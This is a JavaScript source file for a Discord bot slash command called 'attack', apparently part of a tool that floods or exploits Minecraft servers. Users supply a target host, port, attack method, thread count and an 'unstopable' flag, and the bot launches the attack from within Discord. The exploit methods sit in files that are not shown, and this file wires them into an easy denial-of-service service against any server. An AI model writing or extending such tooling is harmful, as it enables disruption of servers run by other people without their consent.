const Command = require('../structure/command.js');
const Discord = require('discord.js');
const mp = require('minecraft-protocol');
const cfg = require('../jsons/config.json');
const Attack = require('../structure/attack.js');

module.exports = new Command({
    name: "attack",
    description: "Start attack to minecraft server using exploit!",
    slashCommandOptions: [{
        name: "host",
        description: "Server host",
        required: true,
        type: Discord.ApplicationCommandOptionType.String
    }, {
        name: "method",
        description: "Method attack",
        required: true,
        type: Discord.ApplicationCommandOptionType.String,
        choices: cfg.Attacks.map((atk) => ({
            name: atk.text,
            value: atk.name
        }))
    }, {
        name: "port",
        description: "Server port",
        required: false,
        type: Discord.ApplicationCommandOptionType.Number,
        minValue: 1,
        maxValue: 65536
    }, {
        name: "threads",
        description: "Threads count",
        required: false,
        type: Discord.ApplicationCommandOptionType.Number,
        minValue: 1,
        maxValue: cfg.General.maxAttackThreads
    }, {
        name: "unstopable",
        description: "Unstopable attack",
        required: false,
        type: Discord.ApplicationCommandOptionType.Boolean
    }],
    permissions: [Discord.PermissionFlagsBits.SendMessages],
    async execute(client, args, interaction) {
        const method = cfg.Attacks.find(a => a.name == args.getString('method'));
        const threads = args.getNumber('threads') ?? cfg.General.maxAttackThreads;
        const host = args.getString('host');
        const port = args.getNumber('port');
        const unstopable = args.getBoolean('unstopable') || false;

        if (unstopable && !cfg.Features.unstopableMode.enable) return await client.errorembed(client, interaction, client.Language.getText("disableUnstopableModeError"));
        if (cfg.General.countAttacks != 0 && client.attacks.size >= cfg.General.countAttacks) return await client.errorembed(client, interaction, client.Language.getText("countAttacksError"));

        const msg = await interaction.deferReply({ fetchReply: true })

        client.attacks.set(msg.id, new Attack({
            client,
            interaction,
            attack: method,
            message: msg,
            hostInfo: { ip: host, port },
            threads,
            unstopable
        }))
    }
});